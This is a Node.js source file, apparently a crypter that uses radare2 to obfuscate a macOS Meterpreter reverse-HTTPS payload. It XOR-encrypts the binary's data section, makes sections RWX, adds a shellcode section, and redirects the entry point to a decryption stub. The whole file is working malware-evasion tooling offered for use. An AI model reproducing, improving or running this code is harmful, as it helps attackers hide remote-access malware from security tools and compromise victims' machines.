const r2promise = require('r2pipe-promise')
const fs = require('fs')
const mustache = require('mustache')
const execFileSync = require('child_process').execFileSync

const XOR_KEY = 0xf

async function find_entry_point(r2) {
  return await r2.cmd('s')
}

async function find_entry_point_bytes(r2) {
  return (await r2.cmd('pxq 8')).split(' ')[2] // TODO: x86 bits
}

async function find_code_cave(r2, sections_to_xor) {
  console.log(await r2.cmd(`?E Searching for code caves`))
  const length = 100
  const res = (await r2.cmd(`/x ${'00'.repeat(length)}`)).split('\n')
  if (res.length < 2) {
    throw new Error(`Could not find a code cave of length ${length}`)
  }

  const executable_sections = (await r2.cmdj('iSj')).filter(x => x.perm === '-r-x')
  const code_caves = res
    .map(x => x.split(' ')[0]) // last is empty line
    .filter(x => x)
    .filter(code_cave => {
      if (code_cave && executable_sections.some(x => x.vaddr <= parseInt(code_cave, 16) && (x.vaddr + x.vsize) > parseInt(code_cave, 16))) {
        console.log(`POTENTIAL CODE CAVE => ${code_cave}`)
        return code_cave
      }
    })

  if (!code_caves.length) {
    throw new Error(`Could not find an executable code cave of length ${length}`)
  }

  const valid_code_caves = code_caves.filter(code_cave => {
    return !sections_to_xor.some(x => x.vaddr <= parseInt(code_cave, 16) && (x.vaddr + x.vsize) > parseInt(code_cave, 16))
  })

  if (!valid_code_caves.length) {
    throw new Error(`Could not find an executable code cave outside the sections to xor of length ${length}`)
  }

  return valid_code_caves[0]
}

async function xor_sections(r2, sections, key = XOR_KEY) {
  for (const s of sections) {
    console.log(await r2.cmd(`?E xoring ${s.name}`))
    console.log('before xor:')
    await r2.cmd(`s ${s.vaddr}`)
    console.log(await r2.cmd(`pd 5`))
    const values = await r2.cmdj(`pxj ${s.vsize}`)
    const new_values = values.map(value => (value ^ key).toString(16).padStart(2, '0')).join('')
    fs.writeFileSync('generated/xored', new_values)
    await r2.cmd(`wxf generated/xored`)
    console.log('after xor:')
    await r2.cmd(`s ${s.vaddr}`)
    console.log(await r2.cmd(`pd 5`))
  }
}

function create_stub(sections, entry_point, entry_point_bytes, xor_key = XOR_KEY) {
  const template = fs.readFileSync('templates/stub.asm.mustache', { encoding: 'utf-8' })
  const data = {
    sections,
    entry_point,
    entry_point_bytes,
    xor_key,
  }

  const instance = mustache.render(template, data)
  fs.writeFileSync('generated/stub.asm', instance)
}

function get_page_start(addr) {
  return Number(BigInt(addr) >> 12n << 12n)
}

async function find_sections(r2) {
  const WHITELIST = [
    //'__TEXT.__text',
    //'__TEXT.__cstring',
    '__DATA.__data'
  ]

  const sections = (await r2.cmdj('iSj'))
    .filter(s => WHITELIST.some(w => s.name.includes(w)))
    .map(s => ({
      ...s,
      page_start: get_page_start(s.vaddr),
      psize: (s.vaddr - get_page_start(s.vaddr) + s.vsize)
    }))

  return sections
}

async function patch_entry_point(r2, entry_point, code_cave) {
  console.log(await r2.cmd(`?E Patching entry point`))
  await r2.cmd(`s ${entry_point}`)
  console.log(`original entry point:\n${await r2.cmd('pd 5')}`)
  await r2.cmd(`"wa jmp ${code_cave}"`)
  console.log(`new entry point:\n${await r2.cmd('pd 5')}`)
}

async function patch_code_cave(r2, code_cave) {
  console.log(await r2.cmd(`?E Writing stub`))
  await r2.cmd(`s ${code_cave}`)
  console.log(`code cave:\n${await r2.cmd('pd 5')}`)
  await r2.cmd(`waf generated/stub.asm`)
  console.log(`written stub:\n${await r2.cmd('pd 28')}`)
}

async function remove_pie(r2, file) {
  console.log(await r2.cmd(`?E Disabling ASLR & PIE - ${file}`))
  console.log(execFileSync('python',  ['deps/disable_aslr/disable_aslr.py', file], { encoding: 'utf-8' }))
}

function make_rwx_and_add_section(file) {
  //console.log(await r2.cmd(`?E Making all rwx, adding new section and disabling PIE - ${file}`))
  console.log(execFileSync('python3',  ['scripts/make-all-rwx-and-add-section.py', file], { encoding: 'utf-8' }))
}

async function find_shellcode_section(r2) {
  const shellcode_section = (await r2.cmdj('iSj')).find(x => x.name.includes('__TEXT.__shellcode'))

  if (!shellcode_section) {
    throw new Error('Cannot find __TEXT.__shellcode section')
  }

  return '0x' + shellcode_section.vaddr.toString(16)
}

async function main(file) {
  try {
    make_rwx_and_add_section(file)
    const r2 = await r2promise.open(file, ['-w'])
    console.log(await r2.cmd(`?E Meterpreter osx/x64/meterpreter_reverse_https manual ofbuscation - ${file}`))
    const entry_point = await find_entry_point(r2)
    const sections = await find_sections(r2)
    //const code_cave = await find_code_cave(r2, sections)
    const shellcode_section = await find_shellcode_section(r2)
    const entry_point_bytes = await find_entry_point_bytes(r2)
    create_stub(sections, entry_point, entry_point_bytes)
    await xor_sections(r2, sections)
    await patch_entry_point(r2, entry_point, shellcode_section)
    await patch_code_cave(r2, shellcode_section)
    //await remove_pie(r2, file)
    console.log(await r2.cmd(`?E Done! Check ${file}`))
    return r2.quit()
  } catch (err) {
    console.error(err)
    process.exit(-1)
  }
}

if (!process.argv[2]) {
    console.log(`Usage: nodejs index.js <FILE>`)
    return
}

fs.copyFileSync(process.argv[2], process.argv[2] + '-obfuscated');

main(process.argv[2] + '-obfuscated')
